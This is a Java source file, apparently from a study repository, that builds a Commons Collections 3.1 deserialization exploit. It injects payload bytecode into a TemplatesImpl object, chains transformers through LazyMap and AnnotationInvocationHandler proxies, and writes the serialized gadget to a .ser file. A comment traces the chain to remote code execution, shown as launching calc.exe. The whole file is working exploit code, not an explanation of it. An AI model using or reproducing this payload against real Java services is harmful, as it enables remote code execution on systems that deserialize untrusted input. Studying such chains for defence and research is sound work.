package CommonsCollections3;

import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;
import  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

/*
    Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Proxy(LazyMap).extrySet()
					LazyMap.get()
						ChainedTransformer.transform()
							InstantiateTransformer.transform()
								(TrAXFilter)Constructor.newInstance()
									TemplatesImpl.newTransformer()
										TemplatesImpl.getTransletInstance()
											(payload实例化)rce->calc.exe
 */
//
//@Dependencies({"commons-collections:commons-collections:3.1"})
//
public class exp {
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, NotFoundException, IOException, CannotCompileException {

        //
        //构造Templates对象
        //
        TemplatesImpl tmp = new TemplatesImpl();

        //rce代码块的对象
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay = pool.get(payload.class.getName());
        byte[] PayCode = pay.toBytecode();

        Class clazz;
        clazz  = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field tf = clazz.getDeclaredField("_bytecodes");
        tf.setAccessible(true);
        tf.set(tmp,new byte[][]{PayCode});
        Field name = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");

        HashMap InnerMap = new HashMap();
        Transformer[] trans = new Transformer[]{
         new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{tmp}
                        )
        };

        ChainedTransformer chined = new ChainedTransformer(trans);
        Map outmap = LazyMap.decorate(InnerMap,chined);

        final Constructor con = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        con.setAccessible(true);
        InvocationHandler han = (InvocationHandler)con.newInstance(Override.class,outmap);
        Map proxy = (Map) Proxy.newProxyInstance(exp.class.getClassLoader(),outmap.getClass().getInterfaces(),han);


        //外层装proxy代理
        final Constructor out_con = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        out_con.setAccessible(true);
        InvocationHandler out_han = (InvocationHandler) out_con.newInstance(Override.class,proxy);

        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commoncollections3.ser");
        FileOutputStream fo = new FileOutputStream(file);
        ObjectOutputStream ObjOut = new ObjectOutputStream(fo);
        ObjOut.writeObject(out_han);









    }
}
